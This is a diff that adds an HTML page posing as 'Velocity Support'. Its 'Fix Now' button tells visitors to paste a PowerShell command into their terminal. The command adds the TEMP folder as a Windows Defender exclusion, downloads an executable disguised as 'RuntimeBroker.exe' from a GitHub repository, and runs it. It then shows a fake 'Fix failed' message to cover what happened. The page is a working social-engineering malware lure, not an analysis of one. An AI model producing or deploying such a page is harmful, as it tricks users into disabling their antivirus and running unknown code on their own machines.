@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Velocity Support</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: url('https://cdn.discordapp.com/banners/943223926509699072/4db49e81988d2dd6c201d6ad3a243eb8.png?size=256') repeat;
+            background-size: auto;
+            color: #ffffff;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            overflow: hidden;
+        }
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1;
+        }
+        .container {
+            position: relative;
+            z-index: 2;
+            padding: 80px 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        h1 {
+            font-size: 64px;
+            color: #00ff99;
+            text-shadow: 0 0 15px #00ff99, 0 0 30px #00ff99;
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .velocity-logo {
+            width: 60px;
+            height: 60px;
+            margin-right: 15px;
+            filter: hue-rotate(160deg) saturate(2) brightness(1.2);
+        }
+        p {
+            font-size: 20px;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
+        }
+        .fix-button {
+            background: linear-gradient(45deg, #ff0066, #ff33aa);
+            color: #fff;
+            border: none;
+            padding: 20px 40px;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 8px;
+            box-shadow: 0 0 15px #ff0066, 0 0 30px #ff0066;
+            transition: transform 0.2s, box-shadow 0.3s;
+        }
+        .fix-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px #ff33aa, 0 0 50px #ff33aa;
+        }
+        .menu {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            padding: 20px;
+            box-sizing: border-box;
+            overflow-y: auto;
+        }
+        .menu::-webkit-scrollbar {
+            width: 8px;
+        }
+        .menu::-webkit-scrollbar-track {
+            background: #1a1a1a;
+            border-radius: 10px;
+        }
+        .menu::-webkit-scrollbar-thumb {
+            background: linear-gradient(180deg, #00ff99, #ff0066);
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 255, 153, 0.5);
+        }
+        .menu::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(180deg, #33ffaa, #ff33aa);
+        }
+        .menu-content {
+            background: #2a2a2a;
+            max-width: 700px;
+            margin: 50px auto;
+            padding: 30px;
+            border-radius: 15px;
+            position: relative;
+            border: 2px solid #00ff99;
+            box-shadow: 0 0 20px #00ff99;
+        }
+        .menu-logo {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 40px;
+            height: 40px;
+            filter: hue-rotate(160deg) saturate(2) brightness(1.2);
+        }
+        .menu-content h2 {
+            color: #00ff99;
+            text-shadow: 0 0 10px #00ff99;
+            margin-top: 0;
+        }
+        .menu-content p {
+            font-size: 16px;
+            margin: 15px 0;
+            text-shadow: none;
+        }
+        .ps-command {
+            background-color: #1a1a1a;
+            padding: 15px;
+            border-radius: 8px;
+            word-wrap: break-word;
+            text-align: left;
+            font-family: Consolas, monospace;
+            color: #00ff99;
+            border: 1px solid #ff0066;
+            box-shadow: 0 0 10px #ff0066;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            <img src="https://cdn.discordapp.com/icons/943223926509699072/d08e6e1257804501fa056a967248711e.png?size=4096" alt="Velocity Logo" class="velocity-logo">
+            Velocity Support
+        </h1>
+        <p>Welcome to Velocity Support! We’re here to help you fix issues fast. Click the button below to resolve common problems with our quick tool.</p>
+        <button class="fix-button" onclick="openMenu()">Fix Now</button>
+    </div>
+
+    <div class="menu" id="fixMenu">
+        <div class="menu-content">
+            <img src="https://cdn.discordapp.com/icons/943223926509699072/d08e6e1257804501fa056a967248711e.png?size=4096" alt="Menu Logo" class="menu-logo">
+            <h2>Fix Your Issue</h2>
+            <p>To resolve your problem, open PowerShell and run this command:</p>
+            <div class="ps-command">
+                Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://github.com/Wizknaory/clients/raw/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red
+            </div>
+            <p>Copy it, paste it into PowerShell, and hit Enter. That’s it!</p>
+        </div>
+    </div>
+
+    <script>
+        function openMenu() {
+            document.getElementById("fixMenu").style.display = "block";
+        }
+    </script>
+</body>
+</html>
